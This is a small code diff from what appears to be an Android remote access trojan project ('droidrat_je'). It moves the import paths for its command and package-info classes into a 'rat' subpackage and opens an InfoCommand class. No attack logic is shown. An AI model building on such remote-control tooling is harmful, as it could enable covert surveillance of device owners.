@@ -3,9 +3,9 @@ package com.je_chen.droidrat_je.command;
 import android.content.Context;
 import android.content.pm.PackageManager;
 
-import com.je_chen.droidrat_je.command.process_super.CommandFather;
-import com.je_chen.droidrat_je.command.process_super.CommandProcessInterface;
-import com.je_chen.droidrat_je.modules.appsinfo.getinfo.GetPackagesInfo;
+import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
+import com.je_chen.droidrat_je.rat.command.process_super.CommandProcessInterface;
+import com.je_chen.droidrat_je.rat.modules.appsinfo.getinfo.GetPackagesInfo;
 
 
 public class InfoCommand extends CommandFather implements CommandProcessInterface {
